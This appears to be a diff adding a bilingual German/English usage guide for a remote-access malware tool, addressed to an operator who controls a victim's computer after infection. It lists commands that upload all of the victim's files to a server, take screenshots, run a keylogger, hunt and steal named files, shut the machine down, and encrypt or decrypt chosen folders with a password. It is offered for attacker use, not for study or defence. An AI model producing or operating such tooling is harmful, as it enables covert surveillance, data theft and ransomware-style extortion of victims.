@@ -1,0 +1,45 @@
+Verwendung:
+Sobald ein Opfer die Schadsoftware auf seinem System installiert hat, stehen dir folgende Befehle zur Verfügung:
+
+Usage:
+
+Once a victim has installed the malware on their system, the following commands are available to you:
+
+/mass-upload – beginnt damit, jede geeignete Datei auf dem Computer des Opfers auf den Server hochzuladen.
+/screen-update – sendet einen Screenshot des Bildschirms des Opfers an den Server
+/quick-info – sammelt Informationen basierend auf ip-api
+/shutdown – fährt den Computer des Opfers herunter
+/keylogger – startet einen Keylogger
+/hunt – sucht nach bestimmten Dateien, die du festlegst, und lädt sie hoch, falls sie gefunden werden, z. B.: /hunt example.docx
+/kill – Dies ist derzeit eine fehlerhafte Funktion, ich werde sie patchen. (Sie soll sich selbst löschen, funktioniert aber nicht.)
+/system-info – zeigt Informationen über den PC des Opfers an.
+/help – öffnet ein Hilfemenü mit allen Befehlen und ihren Funktionen.
+/encrypt – verschlüsselt einen von dir gewählten Pfad mit einem von dir gewählten Passwort, z. B. /encrypt -p 1234 -f "C:\Users\James\Desktop"
+/decrypt – entschlüsselt einen zuvor verschlüsselten Pfad mit dem bei der Verschlüsselung festgelegten Passwort, z. B. /decrypt -p 1234 -f "C:\Users\James\Desktop"
+/tree – zeigt die Systemverzeichnisse eines angegebenen Pfades an, z. B. /tree "C:"
+
+English:
+/mass-upload – begins uploading every suitable file on the victim's computer to the server.
+
+/screen-update – sends a screenshot of the victim's screen to the server.
+
+/quick-info – gathers information based on the IP API.
+
+/shutdown – shuts down the victim's computer.
+
+/keylogger – starts a keylogger.
+
+/hunt – searches for specific files that you specify and uploads them if found, e.g., /hunt example.docx.
+
+/kill – This is currently a broken feature; I will patch it. (It's supposed to delete itself, but it doesn't work.)
+
+/system-info – displays information about the victim's PC.
+
+/help – opens a help menu with all commands and their functions.
+
+/encrypt – encrypts a path of your choice with a password of your choice. B. /encrypt -p 1234 -f "C:\Users\James\Desktop"
+
+/decrypt – decrypts a previously encrypted path using the password set during encryption, e.g., /decrypt -p 1234 -f "C:\Users\James\Desktop"
+
+/tree – displays the system directories of a specified path, e.g., /tree "C:"
+
